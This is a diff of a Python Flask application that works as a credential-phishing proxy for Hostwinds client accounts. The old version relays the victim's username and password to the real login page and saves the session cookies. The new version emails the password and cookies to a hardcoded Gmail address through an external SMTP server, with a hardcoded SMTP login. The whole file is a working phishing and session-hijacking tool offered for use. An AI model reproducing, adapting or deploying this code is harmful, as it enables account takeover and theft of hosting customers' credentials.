@@ -1,106 +1,105 @@
-from flask import Flask, request, render_template_string, redirect, make_response
+import smtplib
 import requests
-from bs4 import BeautifulSoup
+from flask import Flask, request, render_template_string
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 import json
-import time
 
-# Initialize Flask app
+# Flask setup
 app = Flask(__name__)
 
-# Target action URL where you want to send login info
-ACTION_URL = 'https://clients.hostwinds.com/dologin.php'
+# SMTP server details
+SMTP_SERVER = '146.19.254.243'  # Replace with your SMTP server
+SMTP_PORT = 6040  # Non-SSL port
+SMTP_USER = 'auto528@cryptasphere.bio'  # Your email
+SMTP_USERR = 'auto528'
+SMTP_PASSWORD = 'vip7a81be0e2b36'  # Your email password
+TO_EMAIL = 'danielnewwoj@gmail.com'  # Email where you want to send the information
 
-# HTML form template for login
+# Hostwinds login URL
+LOGIN_URL = 'https://clients.hostwinds.com/dologin.php'  # Replace with actual login URL
+
+# HTML form for login (you can customize this form as needed)
 HTML_FORM = """
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
+<head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
-  </head>
-  <body>
-    <h2>Login to Hostwinds</h2>
-    <form action="/login" method="POST">
-      <label for="username">Username:</label>
-      <input type="text" name="username" id="username" required><br><br>
-      <label for="password">Password:</label>
-      <input type="password" name="password" id="password" required><br><br>
-      <input type="submit" value="Login">
+    <title>Login Form</title>
+</head>
+<body>
+    <h2>Login Form</h2>
+    <form action="/submit" method="POST">
+        <label for="username">Username:</label><br>
+        <input type="text" id="username" name="username"><br>
+        <label for="password">Password:</label><br>
+        <input type="password" id="password" name="password"><br><br>
+        <input type="submit" value="Login">
     </form>
-  </body>
+</body>
 </html>
 """
 
-# File where cookies will be saved
-COOKIE_FILE = 'editthiscookie_cookies.json'
-
+# Route to display the form
 @app.route('/')
-def index():
-    # Render the login form
+def form():
     return render_template_string(HTML_FORM)
 
-@app.route('/login', methods=['POST'])
-def login():
-    # Extract username and password from the form
-    username = request.form['username']
-    password = request.form['password']
-    
-    # Start a session to persist cookies and headers
-    with requests.Session() as session:
-        # Send a GET request to fetch the login page (to get any necessary tokens)
-        response = session.get('https://clients.hostwinds.com/clientarea.php')
+# Route to handle form submission and send email
+@app.route('/submit', methods=['POST'])
+def submit():
+    # Capture form data
+    username = request.form.get('username')
+    password = request.form.get('password')
 
-        # Parse the login page for hidden input fields (e.g., CSRF tokens)
-        soup = BeautifulSoup(response.content, 'html.parser')
+    # Prepare data for POST request (Hostwinds login)
+    login_data = {
+        'username': username,
+        'password': password,
+        'login': 'Login'  # Check the actual name of the login button if needed
+    }
+
+    # Create a session to capture cookies
+    session = requests.Session()
+
+    # Send POST request to Hostwinds login
+    try:
+        response = session.post(LOGIN_URL, data=login_data)
         
-        # Look for hidden form fields (adjust based on actual form field names)
-        hidden_fields = {
-            'username': username,
-            'password': password,
-        }
-        
-        for input_tag in soup.find_all('input', type='hidden'):
-            hidden_fields[input_tag['name']] = input_tag['value']
-
-        # Send POST request to the action URL with login data
-        login_response = session.post(ACTION_URL, data=hidden_fields)
-
-        # Check if the login was successful
-        if login_response.status_code == 200:
-            # Capture the cookies from the session
-            cookies = session.cookies.get_dict()
-
-            # Format cookies for EditThisCookie
-            formatted_cookies = []
-            for name, value in cookies.items():
-                cookie = {
-                    'domain': '.hostwinds.com',  # Set the domain to match the target site
-                    'expirationDate': int(time.time()) + 3600,  # Set expiration to 1 hour from now
-                    'hostOnly': False,
-                    'httpOnly': False,
-                    'name': name,
-                    'path': '/',
-                    'secure': False,
-                    'session': True,  # Make it a session cookie (set to False if you need to persist it)
-                    'value': value
-                }
-                formatted_cookies.append(cookie)
-
-            # Save formatted cookies to a JSON file
-            with open(COOKIE_FILE, 'w') as cookie_file:
-                json.dump(formatted_cookies, cookie_file)
-
-            # Create a response object and set the cookies in the response header
-            resp = make_response(redirect('/'))
-            for cookie in formatted_cookies:
-                resp.set_cookie(cookie['name'], cookie['value'], domain=cookie['domain'], path=cookie['path'])
-
-            # Return the response with the cookies set, redirecting to the original form
-            return resp
+        # Check if login is successful (you may need to inspect the response)
+        if response.status_code == 200 and "Dashboard" in response.text:
+            cookies = session.cookies.get_dict()  # Capture session cookies
         else:
-            return "Login failed! Please check your credentials."
+            return "Login failed, please check your credentials."
+
+    except Exception as e:
+        return f"Error during login request: {str(e)}"
+
+    # Compose the email with form data and cookies
+    message = MIMEMultipart()
+    message['From'] = SMTP_USER
+    message['To'] = TO_EMAIL
+    message['Subject'] = 'Login Information and Cookies'
+
+    # Email body containing the login data and cookies
+    body = f"""
+    Username: {username}
+    Password: {password}
+
+    Cookies: 
+    {json.dumps(cookies, indent=2)}  # Sending the cookies as formatted JSON
+    """
+    message.attach(MIMEText(body, 'plain'))
+
+    # Sending the email via SMTP on port 6040 (no SSL)
+    try:
+        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
+            # Login to SMTP server (no SSL)
+            server.login(SMTP_USERR, SMTP_PASSWORD)
+            server.sendmail(SMTP_USER, TO_EMAIL, message.as_string())  # Send the email
+            return "Form submitted and email sent successfully!"
+    except Exception as e:
+        return f"Error sending email: {str(e)}"
 
 if __name__ == '__main__':
-    # Run the Flask app on a local server
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    app.run(debug=True, port=5000)
